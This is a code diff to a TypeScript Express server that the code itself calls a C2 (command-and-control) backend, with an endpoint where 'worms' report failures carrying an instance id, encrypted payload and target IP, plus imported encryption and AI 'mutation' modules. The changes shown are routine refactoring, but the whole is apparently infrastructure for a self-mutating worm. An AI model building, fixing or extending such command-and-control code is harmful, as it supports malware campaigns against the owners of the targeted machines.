@@ -7,6 +7,10 @@ import { encrypt, decrypt } from './modules/crypto';
 import { generateMutation } from './modules/ai';
 import { ErrorLog } from '../types/index';
 import fs from 'fs';
+import { fileURLToPath } from 'url';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 const httpServer = createServer(app);
@@ -21,31 +25,11 @@ const PORT = process.env.C2_PORT || 4000;
 // FIX: Cast middleware to 'any' to resolve a type mismatch error. This is a workaround for a likely issue with conflicting @types/express versions or tsconfig settings.
 app.use(express.json() as any);
 
-// --- Static File Serving (Robust Path Correction) ---
-// This robustly finds the project root whether running from /src or /dist
-const findProjectRoot = () => {
-    let currentDir = __dirname;
-    while (!fs.existsSync(path.join(currentDir, 'package.json'))) {
-        currentDir = path.join(currentDir, '..');
-        if (currentDir === '/') {
-            throw new Error('Could not find project root containing package.json');
-        }
-    }
-    return currentDir;
-};
-const projectRoot = findProjectRoot();
-// FIX: Cast middleware to 'any' to resolve a type mismatch error. This is a workaround for a likely issue with conflicting @types/express versions or tsconfig settings.
-app.use(express.static(projectRoot) as any);
-logger.info(`Serving static files from project root: ${projectRoot}`);
-// ---
-
 // Type guard to check if an object is a valid ErrorLog
 function isErrorLog(obj: any): obj is ErrorLog {
     return obj && typeof obj.type === 'string' && typeof obj.details === 'string' && typeof obj.targetIp === 'string';
 }
 
-// Endpoint for worms to report failures
-// FIX: Removed explicit Request and Response types from handler to allow type inference, which resolves property access errors on req.body and res.status, and also fixes the overload error for app.post.
 app.post('/api/report', async (req, res) => {
     const { instanceId, payload, key } = req.body;
     
@@ -115,5 +99,5 @@ io.on('connection', (socket) => {
 });
 
 httpServer.listen(PORT, () => {
-    logger.info(`C2 Website server is live. Visualizer at http://localhost:${PORT}`);
+    logger.info(`C2 Backend server is live on http://localhost:${PORT}`);
 });
